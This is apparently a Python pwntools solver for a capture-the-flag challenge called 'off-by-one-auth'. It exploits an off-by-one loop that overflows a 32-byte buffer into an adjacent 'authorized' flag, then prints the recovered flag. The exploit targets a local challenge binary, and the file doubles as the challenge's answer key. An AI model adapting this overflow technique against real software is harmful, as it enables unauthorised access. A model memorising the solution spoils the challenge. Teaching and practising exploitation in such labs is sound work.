#!/usr/bin/env python3
"""Solver for off-by-one-auth.

The input loop runs `for (i = 0; i <= n; i++)`, so asking for the maximum
allowed count (32) makes it write 33 bytes into a 32-byte buffer. That extra
byte overwrites the low byte of the adjacent `authorized` field. We request 32
bytes and send 33 bytes; the 33rd (non-zero) sets the gate and reveal() runs.
"""
import os
import re

from pwn import context, process

context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")


def main() -> None:
    p = process(BIN)
    p.recvline()  # prompt
    p.sendline(b"32")
    p.send(b"A" * 33)  # 33rd byte lands on authorized's low byte
    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
